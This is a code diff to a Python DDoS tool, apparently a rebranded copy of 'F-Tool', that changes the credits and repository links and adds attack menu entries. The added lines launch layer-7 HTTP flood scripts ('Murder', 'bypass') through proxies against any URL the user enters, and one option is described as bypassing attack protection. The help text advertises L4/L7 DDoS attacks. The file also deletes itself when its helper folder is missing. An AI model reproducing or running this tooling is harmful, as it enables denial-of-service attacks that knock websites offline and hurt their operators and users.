@@ -78,7 +78,7 @@ class Home:
     {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}24/10/2022      {Color.LG}║
     {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v3  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
                         {Color.LG}╚══════════════════════╝
-    {Color.LR}[{Color.LG}>     Made with By NguyenDangTrinh    {Color.LG}<{Color.LR}]""")
+    {Color.LR}[{Color.LG}>     By TaliGanda Or Lex/LostC2    {Color.LG}<{Color.LR}]""")
 		print(Color.LC+"    Type "+Color.LB+"'HELP'"+Color.LC+" to see all commands\n\n")
 		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" Proxy")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" WebTool")
@@ -591,7 +591,9 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HUM4N ERR0R: FUCK YOU (JS)")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HUM4N 3RR0R: FUCK YOU (Sonic Network)")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" VOID: Bypass + Attack Protect Custom (IHP)")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" AIRSTRIKE: C0M1NG S00N.... (LostC2)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -614,7 +616,17 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-
+			elif option in ['02', '2']:
+				try:
+					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					username = int(input(f"{Color.LG} [>] Username: "+Color.RESET))
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/Murder {url} {floodtime} 15 utils/proxy.txt 512'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+				except:
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					
 			elif option in ['ref', 'REF']:
 				self.l7()
 			elif option in ['home', 'HOME']:
@@ -690,7 +702,7 @@ def main():
 	except IsADirectoryError:pass
 	except FileNotFoundError:
 		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-		print("\n[+] Please download on GitHub, or git clone: https://github.com/ngdangtr/F-Tool.git\n")
+		print("\n[+] Please download on GitHub, or git clone: https://github.com/TaliGanda/Tiger_Private.git\n")
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
@@ -705,7 +717,7 @@ if __name__ == '__main__':
 {Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
 {Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
 {Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
-	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/ngdangtr
+	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://github.com/TaliGanda
 {Color.LC}Momo{Color.LR}: {Color.LY}0965849504"""
 	F_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
